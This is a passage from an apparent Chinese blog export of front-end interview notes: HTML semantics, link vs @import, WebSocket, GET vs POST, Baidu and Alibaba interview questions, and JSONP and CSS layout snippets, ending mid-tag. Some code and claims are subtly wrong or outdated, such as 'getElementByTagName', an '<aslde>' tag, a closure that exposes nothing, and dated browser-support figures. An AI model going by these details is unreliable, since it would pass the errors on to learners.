id="9-说说你对HTML语义化的理解"><a href="#9-说说你对HTML语义化的理解" class="headerlink" title="9. 说说你对HTML语义化的理解?"></a>9. 说说你对HTML语义化的理解?</h3><p>(1)什么是 HTML 语义化？</p><p><基本上都是围绕着几个主要的标签，像标题（ H1~H6 ）、列表（ li ）、强调（ strong em ）等等 >根据内容的结构化（内容语义化），选择合适的标签（代码语义化）便于开发者阅读和写出更优雅的代码的同时让浏览器的爬虫和机器很好地解析。</p><p>(2)为什么要语义化？</p><p>为了在没有CSS的情况下，页面也能呈现出很好地内容结构、代码结构 : 为了裸奔时好看；用户体验：例如title、 alt 用于解释名词或解释图片信息、 label 标签的活用；有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重；方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页；便于团队开发和维护，语义化更具可读性，是下一步吧网页的重要动向，遵循W3C标准的团队都遵循这个标准，可以减少差异化。</p><p>(3) 语义化标签</p><ul><li><header></header></li><li><footer></footer></li><li><nav></nav></li><li><section></section></li><li><article></article> SM:用来在页面中表示一套结构完整且独立的内容部分</li><li><aslde> SM:主题的附属信息 ( 用途很广，主要就是一个附属内容 ) ，如果 article 里面为一篇文章的话，那么文章的作者以及信息内容就是这篇文章的附属内容了</aslde></li><li><figure></figure>SM:媒体元素，比如一些视频，图片啊等等</li><li><datalist></datalist></li><li>SM:选项列表，与 input 元素配合使用，来定义 input 可能的值</li><li><details></details></li><li>SM:用于描述文档或者文档某个部分的细节 ~ 默认属性为 open~</li><li>ps:配合 summary 一起使用</li></ul><h3 id="10-link和-import的区别"><a href="#10-link和-import的区别" class="headerlink" title="10. link和@import的区别?"></a>10. link和@import的区别?</h3><p>XML/HTML代码<br></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">rev</span>=<span class="string">'stylesheet'</span> <span class="attr">href</span>=<span class="string">'CSS文件 '</span> <span class="attr">type</span>=<span class="string">'text/css'</span> <span class="attr">media</span>=<span class="string">'all'</span> /></span></span><br><span class="line"></span><br><span class="line"><span class="tag"><<span class="name">style</span> <span class="attr">type</span>=<span class="string">'text/css'</span> <span class="attr">media</span>=<span class="string">'screen'</span>></span></span><br><span class="line">@import url('CSS文件 ');</span><br><span class="line"><span class="tag"></<span class="name">style</span>></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>两者都是外部引用CSS的方式，但是存在一定的区别：</p><ul><li>区别1： link 是 XHTML 标签，除了加载 CSS 外，还可以定义 RSS 等其他事务； @import 属于 CSS 范畴，只能加载 CSS 。</li><li>区别2： link 引用 CSS 时，在页面载入时同时加载； @import 需要页面网页完全载入以后加载。</li><li>区别3： link 是 XHTML 标签，无兼容问题； @import 是在 CSS2.1 提出的，低版本的浏览器不支持。</li><li>区别4： ink 支持使用 Javascript 控制 DOM 去改变样式；而 @import 不支持。</li></ul><h3 id="11-说说超链接target属性的取值和作用？"><a href="#11-说说超链接target属性的取值和作用？" class="headerlink" title="11. 说说超链接target属性的取值和作用？"></a>11. 说说超链接target属性的取值和作用？</h3><p>target这个属性指定所链接的页面在浏览器窗口中的打开方式。<br>它的参数值主要有：</p><ul><li>_blank ：在新浏览器窗口中打开链接文件</li><li>_parent ：将链接的文件载入含有该链接框架的父框架集或父窗口中。如果含有该链接的框架不是嵌套的，则在浏览器全屏窗口中载入链接的文件，就象 _self 参数一。</li><li>_self ：在同一框架或窗口中打开所链接的文档。此参数为默认值，通常不用指定。但是我不太理解。</li><li>_top ：在当前的整个浏览器窗口中打开所链接的文档，因而会删除所有框架。</li></ul><h3 id="12-data-属性的作用是什么？"><a href="#12-data-属性的作用是什么？" class="headerlink" title="12. data-属性的作用是什么？"></a>12. <code>data-</code>属性的作用是什么？</h3><p><code>data-</code>为前端开发者提供自定义的属性，这些属性集可以通过对象的 <code>dataset</code> 属性获取，不支持该属性的浏览器可以通过 <code>getAttribute</code> 方法获取。</p><p>需要注意的是：<code>data-</code>之后的以连字符分割的多个单词组成的属性，获取的时候使用驼峰风格。并不是所有的浏览器都支持 .<code>dataset</code> 属性，测试的浏览器中只有 Chrome 和 Opera 支持。<br>即：当没有合适的属性和元素时，自定义的 data 属性是能够存储页面或 App 的私有的自定义数据。</p><h3 id="13-介绍一下你对浏览器内核的理解？"><a href="#13-介绍一下你对浏览器内核的理解？" class="headerlink" title="13. 介绍一下你对浏览器内核的理解？"></a>13. 介绍一下你对浏览器内核的理解？</h3><p>主要分成两部分：渲染引擎(layout engineer或 Rendering Engine) 和 JS 引擎。</p><ul><li>渲染引擎：负责取得网页的内容（HTML、 XML 、图像等等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核。</li><li>JS引擎则：解析和执行 javascript 来实现网页的动态效果。<br>最开始渲染引擎和JS引擎并没有区分的很明确，后来 JS 引擎越来越独立，内核就倾向于只指渲染引擎。</li></ul><h3 id="14-iframe有那些缺点？"><a href="#14-iframe有那些缺点？" class="headerlink" title="14. iframe有那些缺点？"></a>14. iframe有那些缺点？</h3><ul><li>iframe会阻塞主页面的 Onload 事件；</li><li>搜索引擎的检索程序无法解读这种页面，不利于 SEO;</li><li>iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载。</li><li>使用iframe之前需要考虑这两个缺点。如果需要使用 iframe ，最好是通过 javascript动态给iframe添加 src 属性值，这样可以绕开以上两个问题。</li></ul><h3 id="15-如何实现浏览器内多个标签页之间的通信"><a href="#15-如何实现浏览器内多个标签页之间的通信" class="headerlink" title="15. 如何实现浏览器内多个标签页之间的通信?"></a>15. 如何实现浏览器内多个标签页之间的通信?</h3><ul><li>WebSocket、 SharedWorker；</li><li>也可以调用localstorge、 cookies 等本地存储方式；</li><li>localstorge另一个浏览上下文里被添加、修改或删除时，它都会触发一个事件，</li><li>我们通过监听事件，控制它的值来进行页面信息通信；</li><li>注意quirks： Safari 在无痕模式下设置 localstorge 值时会抛出 QuotaExceededError 的异常；</li></ul><h3 id="16-HTML5标签的作用-用途"><a href="#16-HTML5标签的作用-用途" class="headerlink" title="16. HTML5标签的作用?(用途)"></a>16. HTML5标签的作用?(用途)</h3><ul><li>使Web页面的内容更加有序和规范</li><li>使搜索引擎更加容易按照HTML5规则识别出有效的内容 </li><li>使Web页面更接近于一种数据字段和表</li></ul><h3 id="17-简述一下src与href的区别？"><a href="#17-简述一下src与href的区别？" class="headerlink" title="17. 简述一下src与href的区别？"></a>17. 简述一下src与href的区别？</h3><p>src用于替换当前元素， href 用于在当前文档和引用资源之间确立联系。</p><p>src是 source 的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求 src 资源时会将其指向的资源下载并应用到文档内，例如 js 脚本， img 图片和 frame 等元素。<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><script src =<span class="string">'js.js'</span>><span class="xml"><span class="tag"></<span class="name">script</span>></span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部。</p><p>href是 Hypertext Reference的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接，如果我们在文档中添加<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><link href=<span class="string">'common.css'</span> rel=<span class="string">'stylesheet'</span>/></span><br></pre></td></tr></tbody></table></figure><p></p><p>那么浏览器会识别该文档为css文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用 link 方式来加载 css ，而不是使用 @import 方式。</p><h3 id="18-WebSocket与消息推送？"><a href="#18-WebSocket与消息推送？" class="headerlink" title="18. WebSocket与消息推送？"></a>18. WebSocket与消息推送？</h3><p>B/S架构的系统多使用HTTP协议，<br>HTTP协议的特点： 1 无状态协议 2 用于通过 Internet 发送请求消息和响应消息 3 使用端口接收和发送消息，默认为80端口 底层通信还是使用Socket完成。<br>HTTP协议决定了服务器与客户端之间的连接方式，无法直接实现消息推送,一些变相的解决办法：</p><p>双向通信与消息推送</p><p>轮询：客户端定时向服务器发送Ajax请求，服务器接到请求后马上返回响应信息并关闭连接。 </p><ul><li>优点：后端程序编写比较容易。 </li><li>缺点：请求中有大半是无用，浪费带宽和服务器资源。 </li><li>实例：适于小型应用。</li></ul><p>长轮询：客户端向服务器发送Ajax请求，服务器接到请求后 hold 住连接，直到有新消息才返回响应信息并关闭连接，客户端处理完响应信息后再向服务器发送新的请求。 </p><ul><li>优点：在无消息的情况下不会频繁的请求，耗费资小。 </li><li>缺点：服务器hold连接会消耗资源，返回数据顺序无保证，难于管理维护。 Comet 异步的 ashx ， </li><li>实例：WebQQ、 Hi 网页版、 Facebook IM 。</li></ul><p>长连接：在页面里嵌入一个隐蔵iframe，将这个隐蔵 iframe 的 src 属性设为对一个长连接的请求或是采用xhr请求，服务器端就能源源不断地往客户端输入数据。 </p><ul><li>优点：消息即时到达，不发无用请求；管理起来也相对便。 </li><li>缺点：服务器维护一个长连接会增加开销。 </li><li>实例：Gmail聊天</li></ul><p>Flash Socket：在页面中内嵌入一个使用了 Socket 类的 Flash 程序 JavaScript 通过调用此 Flash 程序提供的 Socket 接口与服务器端的 Socket 接口进行通信， JavaScript 在收到服务器端传送的信息后控制页面的显示。 </p><ul><li>优点：实现真正的即时通信，而不是伪即时。 </li><li>缺点：客户端必须安装Flash插件；非 HTTP 协议，无法自动穿越防火墙。 </li><li>实例：网络互动游戏。</li></ul><p>Websocket:WebSocket是 HTML5 开始提供的一种浏览器与服务器间进行全双工通讯的网络技术。依靠这种技术可以实现客户端和服务器端的长连接，双向实时通信。<br>特点:</p><ul><li>事件驱动</li><li>异步</li><li>使用 ws 或者 wss 协议的客户端 socket</li><li>能够实现真正意义上的推送功能</li><li>缺点：少部分浏览器不支持，浏览器支持的程度与方式有区别。</li></ul><h3 id="19-表单提交中Get和Post方式的区别？"><a href="#19-表单提交中Get和Post方式的区别？" class="headerlink" title="19. 表单提交中Get和Post方式的区别？"></a>19. 表单提交中Get和Post方式的区别？</h3><ul><li>get 是从服务器上获取数据， post 是向服务器传送数据。</li><li>get 服务器会检测数据有没有更新，若无更新则不会拉取新的数据，返回状态码304,；post请求是不管有没有更新都会再把数据传输一次，成功状态码为200。</li><li>get 是把参数数据队列加到提交表单的 ACTION 属性所指的 URL 中，值和表单内各个字段一一对应，在 URL 中可以看到。 post 是通过 HTTP post 机制，将表单内各个字段与其内容放置在 HTML HEADER 内一起传送到 ACTION 属性所指的 URL 地址 , 用户看不到这个过程。</li><li>对于 get 方式，服务器端用 Request.QueryString 获取变量的值，对于 post 方式，服务器端用 Request.Form 获取提交的数据。</li><li>get 传送的数据量较小，不能大于 2KB 。 post 传送的数据量较大，一般被默认为不受限制。但理论上， IIS4 中最大量为 80KB ， IIS5 中为 100KB 。</li><li>get 安全性非常低， post 安全性较高。</li></ul><h3 id="20-HTML5-有哪些新增的表单元素？"><a href="#20-HTML5-有哪些新增的表单元素？" class="headerlink" title="20. HTML5 有哪些新增的表单元素？"></a>20. HTML5 有哪些新增的表单元素？</h3><ul><li>datalist</li><li>datetime</li><li>output</li><li>keygen </li><li>date </li><li>month </li><li>week</li><li>time</li><li>color</li><li>number </li><li>range </li><li>email </li><li>Url</li></ul><h3 id="21-HTML5-废弃了哪些-HTML4-标签？"><a href="#21-HTML5-废弃了哪些-HTML4-标签？" class="headerlink" title="21. HTML5 废弃了哪些 HTML4 标签？"></a>21. HTML5 废弃了哪些 HTML4 标签？</h3><p>HTML5 废弃了一些过时的，不合理的HTML 标签：</p><ul><li>frame</li><li>frameset</li><li>noframe</li><li>applet</li><li>big</li><li>center</li><li>basefront</li></ul><h3 id="22-HTML5-应用程序缓存和浏览器缓存有什么区别？"><a href="#22-HTML5-应用程序缓存和浏览器缓存有什么区别？" class="headerlink" title="22. HTML5 应用程序缓存和浏览器缓存有什么区别？"></a>22. HTML5 应用程序缓存和浏览器缓存有什么区别？</h3><p>应用程序缓存是 HTML5  的重要特性之一，提供了离线使用的功能，让应用程序可以获取本地的网站内容，例如 HTML 、 CSS 、图片以及 JavaScript 。这个特性可以提高网站性能，它的实现借助于 manifest 文件，如下：<br></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><!doctype html></span></span><br><span class="line"><span class="tag"><<span class="name">html</span> <span class="attr">manifest</span>=<span class="string">”example.appcache”</span>></span></span><br><span class="line">…..</span><br><span class="line"><span class="tag"></<span class="name">html</span>></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>与传统浏览器缓存相比，它不强制用户访问的网站内容被缓存。</p><h3 id="23-HTML-5-Canvas-vs-SVG"><a href="#23-HTML-5-Canvas-vs-SVG" class="headerlink" title="23. HTML 5 Canvas vs. SVG"></a>23. HTML 5 Canvas vs. SVG</h3><p><strong>Canvas 和 SVG 都允许您在浏览器中创建图形，但是它们在根本上是不同的。</strong></p><p><strong>SVG</strong></p><p>SVG 是一种使用 XML 描述 2D 图形的语言。</p><p>SVG 基于 XML，这意味着 SVG DOM 中的每个元素都是可用的。您可以为某个元素附加 JavaScript 事件处理器。</p><p>在 SVG 中，每个被绘制的图形均被视为对象。如果 SVG 对象的属性发生变化，那么浏览器能够自动重现图形。</p><p><strong>Canvas</strong></p><p>Canvas 通过 JavaScript 来绘制 2D 图形。</p><p>Canvas 是逐像素进行渲染的。</p><p>在 canvas 中，一旦图形被绘制完成，它就不会继续得到浏览器的关注。如果其位置发生变化，那么整个场景也需要重新绘制，包括任何或许已被图形覆盖的对象。</p><p><strong>Canvas 与 SVG 的比较</strong></p><p>下表列出了 canvas 与 SVG 之间的一些不同之处。</p><p>Canvas</p><ul><li>依赖分辨率</li><li>不支持事件处理器</li><li>弱的文本渲染能力</li><li>能够以 .png 或 .jpg 格式保存结果图像</li><li>最适合图像密集型的游戏，其中的许多对象会被频繁重绘</li></ul><p>SVG</p><ul><li>不依赖分辨率</li><li>支持事件处理器</li><li>最适合带有大型渲染区域的应用程序（比如谷歌地图）</li><li>复杂度高会减慢渲染速度（任何过度使用 DOM 的应用都不快）</li><li>不适合游戏应用</li></ul></body></html>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端实习总结</title>
      <link href="/2018/05/06/%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/"/>
      <url>/2018/05/06/%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="百度一面："><a href="#百度一面：" class="headerlink" title="百度一面："></a>百度一面：</h2><ol><li>内联元素与块级元素的区别，inline-block特性，<img>标签为什么可以定义大小。</li><li>对css刻度的理解？em和rem的区别？若line-height为100%是什么情况？若line-height为1.5无单位是什么情况？</li><li>call和apply的区别？（记不清问没问）</li><li>顺序插入n个<a>标签，然后点击某个</a><a>弹出它的序号？如何创建元素？如何插入元素？注意闭包的同时如何能对其进行优化？（优化没答上来）</a></li><li>事件流？IE下是事件冒泡还是事件捕捉？addEventListener和attachEvent？</li><li>用原生就是实现文档中对类的获取如同Jquery中的$(.abcd)?本题中回答时判断dom中的类与传入的类名是否相同时用了indexOf，被指出不对，应用正则表达式？可惜正则不会。。。。</li><li>如何实现不同页面的通信</li><li>localStorage与sessionStorage的异同。</li><li>若由a界面调到b界面再从b界面点击确定调到c界面，如何点击浏览器中的后退按钮直接返回到a界面。（不会）</li><li>说出几种水平垂直居中的方法。（这个问题一面二面都问了）</li><li>link和@import的区别</li></ol><h2 id="百度二面："><a href="#百度二面：" class="headerlink" title="百度二面："></a>百度二面：</h2><ol><li>简单介绍下项目，说明项目中遇到的难点是如何解决的。</li><li>做项目会切图一般选择什么格式的图。这里gg了，回答是png因为png可以使图片透明？问什么时候选择jpg？哪个是无损压缩哪个是有损压缩。ps：平时我都是看心情的好吗</li><li>CSS优先级</li><li>说出几种水平垂直居中的方法。（这个问题一面二面都问了）</li><li>如何设计一个单页面应用</li><li>对路由的理解</li><li>H5的新特性？回答了新增了哪些元素，移除了哪些元素。</li><li>然后回答了新增了Web存储API，问sessionStorage和 localStorage 的区别？如果baike.baidu.com和<a href="http://www.baidu.com能否共享sessionStorage？能否共享localStorage？baidu.com与www.baidu.com能否共享localStorage？localStorage的存储时间是多久？存储大小？sessionStorage存储大小是多少？cookie存储量？" target="_blank" rel="noopener">www.baidu.com能否共享sessionStorage？能否共享localStorage？baidu.com与www.baidu.com能否共享localStorage？localStorage的存储时间是多久？存储大小？sessionStorage存储大小是多少？cookie存储量？</a></li><li>继续h5新特性，说了新增canvas API。问canvas绘图与svg绘图有何区别？</li><li>继续h5新特性，说了websocket。问websocket与http的区别？websocket与socket有什么关系？</li><li>继续h5新特性，audio与vedio里一般选择什么格式的音频或视频？</li><li>终于结束H5新特性了？问get和post的区别？</li><li>说了get有可能会传状态码304，post会传200。问状态码301和302的区别，什么情况下会是301什么情况是302。</li><li>如果是get请求http如何判断返回的是304，或是200。（Etag）</li><li>刚说http时说了请求头，问有没有请求体，请求体里放的是什么？这时脑子一抽回答没有，就问那文件上传怎么上传？</li><li>最后问他问题的时候问了请求体的问题，他回答说是有请求体的，比如在文件上传的时候请求头里会有一个参数，然后请求体里是二进制文件。</li><li>浏览器缓存机制</li></ol><h2 id="阿里一面："><a href="#阿里一面：" class="headerlink" title="阿里一面："></a>阿里一面：</h2><p>感觉要挂</p><ol><li>介绍自己前端情况</li><li>git的相关命令，如何解决冲突</li><li>对闭包的理解</li><li>盒模型</li><li>BFC</li><li>事件模型</li><li>事件代理</li><li>在线测评中如何使用事件代理</li><li>知道哪些设计模式、设计原则</li><li>在项目中遇到冲突，如何解决</li><li>前端哪个方向发展</li><li>受到批评，心理状态</li></ol><h2 id="阿里二面"><a href="#阿里二面" class="headerlink" title="阿里二面"></a>阿里二面</h2><p>一面竟然没挂，杀入二面，但感觉二面会挂</p><ol><li>介绍一下英语比赛项目</li><li>介绍下长连接</li><li>如何实现长连接</li><li>如何实现轮询</li><li>setTimeout与setInterval区别</li><li>递归调用 setTimeout 与setInterval有何区别</li><li>最新的项目用到哪些前端框架</li><li>还学过哪些语言，对那种了解较深</li><li>设计模式</li><li>阅读过jquery源码？介绍源码</li><li>压力大的时候心理状态</li><li>如何判断一个数字</li></ol></body></html>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔试面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端面试300题</title>
      <link href="/2018/05/06/%E9%9D%A2%E8%AF%95300%E9%A2%98/"/>
      <url>/2018/05/06/%E9%9D%A2%E8%AF%95300%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>1、手写jsonp的实现</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function createJs(sUrl) {</span><br><span class="line">    var s = document.createElement('script');</span><br><span class="line">    s.type = 'text/javascript';</span><br><span class="line">    s.src = sUrl;</span><br><span class="line">    document.getElementByTagName('head')[0].appendChild(s);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>2、手写链表倒数第K个查找<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/*public class ListNode {</span><br><span class="line">    int val;</span><br><span class="line">    ListNode next = null;</span><br><span class="line">    </span><br><span class="line">    ListNode(int val) {</span><br><span class="line">        this.val = val;</span><br><span class="line">    }</span><br><span class="line">}*/</span><br><span class="line">public class Solution {</span><br><span class="line">    public ListNode FindKthToTail(ListNode head,int k) {</span><br><span class="line">        if(head==null||k<=0){</span><br><span class="line">        return null;</span><br><span class="line">        }</span><br><span class="line">        ListNode pre=head;</span><br><span class="line">        ListNode last=head;</span><br><span class="line">        for(int i=1;i<k;i++){</span><br><span class="line">            if(pre.next!=null){</span><br><span class="line">                pre=pre.next;</span><br><span class="line">            }else{</span><br><span class="line">                return null;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        while(pre.next!=null){</span><br><span class="line">            pre = pre.next;</span><br><span class="line">            last=last.next;</span><br><span class="line">        }</span><br><span class="line">        return last;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>3、http请求头，请求体，cookie在哪个里面？url在哪里面？</p><pre><code>cookie在request header里，url在general header里</code></pre><p>4、原型链的解释</p><p>JavaScript 的每个对象都继承另一个对象，后者称为“原型”（prototype）对象。只有null除外，它没有自己的原型对象</p><p>对象的属性和方法，有可能是定义在自身，也有可能是定义在它的原型对象。由于原型本身也是对象，又有自己的原型，所以形成了一条原型链（prototype chain）。比如，a对象是b对象的原型，b对象是c对象的原型，以此类推</p><p>如果一层层地上溯，所有对象的原型最终都可以上溯到Object.prototype，即Object构造函数的prototype属性指向的那个对象。那么，Object.prototype对象有没有它的原型呢？回答可以是有的，就是没有任何属性和方法的null对象，而null对象没有自己的原型。</p><p>5、对闭包的理解，实现一个暴露内部变量，而且外部可以访问修改的函数</p><p>Closures (闭包)是使用被作用域封闭的变量，函数，闭包等执行的一个函数的作用域。通常我们用和其相应的函数来指代这些作用域。(可以访问独立数据的函数)<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function A () {</span><br><span class="line">    var a = 1;</span><br><span class="line">    return function () {</span><br><span class="line">        a++;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>6、基本的数据类型</p><p>number,string,boolen,undefined,null,object</p><p>7、基本的两列自适应布局</p><h3 id="左列定宽，右列自适应"><a href="#左列定宽，右列自适应" class="headerlink" title="左列定宽，右列自适应"></a>左列定宽，右列自适应</h3><p>margin + float</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"parent"</span>></span></span><br><span class="line">    <span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>></span><span class="tag"><<span class="name">p</span>></span>left<span class="tag"></<span class="name">p</span>></span><span class="tag"></<span class="name">div</span>></span></span><br><span class="line">    <span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right-fix"</span>></span></span><br><span class="line">        <span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>></span></span><br><span class="line">            <span class="tag"><<span class="name">p</span>></span>right<span class="tag"></<span class="name">p</span>></span><span class="tag"><<span class="name">p</span>></span>right<span class="tag"></<span class="name">p</span>></span></span><br><span class="line">        <span class="tag"></<span class="name">div</span>></span></span><br><span class="line">    <span class="tag"></<span class="name">div</span>></span></span><br><span class="line"><span class="tag"></<span class="name">div</span>></span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.left</span>{</span><br><span class="line">    float: left;     //向左浮动</span><br><span class="line">    width: 100px;    //固定宽度</span><br><span class="line">    position: relative;//由于.left与.right-fix重合，且.right-fix在DOM树上的位置比.left要后，因此.right-fix会遮挡住.left，设置.left为relative可以让其冒出来。</span><br><span class="line">    </span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.right-fix</span>{</span><br><span class="line">    float: right;     //向右浮动</span><br><span class="line">    width: 100%;    //为了自适应设为100%</span><br><span class="line">    margin-left: -100px;//由于宽度设为100%，.right-fix遭到浏览器换行处理；因此通过设置负的margin值，在左侧制造出100px的空白，使.right-fix与.left重合（即处于同一行）</span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.right</span>{</span><br><span class="line">    margin-left: 120px;    //由于.left和.right-fix重合了，因此给.right设置一个margin-left，避免内容区（.right）与.left重合。另外，120px - 100px = 多出来的20px实际上就相当于.left和.right之间的间隔了。</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>absolute<br></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"parent"</span>></span></span><br><span class="line">    <span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>></span></span><br><span class="line">        <span class="tag"><<span class="name">p</span>></span>left<span class="tag"></<span class="name">p</span>></span></span><br><span class="line">    <span class="tag"></<span class="name">div</span>></span></span><br><span class="line">    <span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>></span></span><br><span class="line">        <span class="tag"><<span class="name">p</span>></span>right<span class="tag"></<span class="name">p</span>></span></span><br><span class="line">        <span class="tag"><<span class="name">p</span>></span>right<span class="tag"></<span class="name">p</span>></span></span><br><span class="line">    <span class="tag"></<span class="name">div</span>></span></span><br><span class="line"><span class="tag"></<span class="name">div</span>></span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>{</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.left</span>{</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.right</span>{</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    left: 120px;    //比.left的left多出20px，相当于间隔</span><br><span class="line">    <span class="selector-tag">right</span>: 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="左列不定宽，右列自适应"><a href="#左列不定宽，右列自适应" class="headerlink" title="左列不定宽，右列自适应"></a>左列不定宽，右列自适应</h3><p>float + BFC<br></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"parent"</span>></span></span><br><span class="line">    <span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>></span></span><br><span class="line">        <span class="tag"><<span class="name">p</span>></span>left<span class="tag"></<span class="name">p</span>></span></span><br><span class="line">    <span class="tag"></<span class="name">div</span>></span></span><br><span class="line">    <span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>></span></span><br><span class="line">        <span class="tag"><<span class="name">p</span>></span>right<span class="tag"></<span class="name">p</span>></span></span><br><span class="line">        <span class="tag"><<span class="name">p</span>></span>right<span class="tag"></<span class="name">p</span>></span></span><br><span class="line">    <span class="tag"></<span class="name">div</span>></span></span><br><span class="line"><span class="tag"></<span 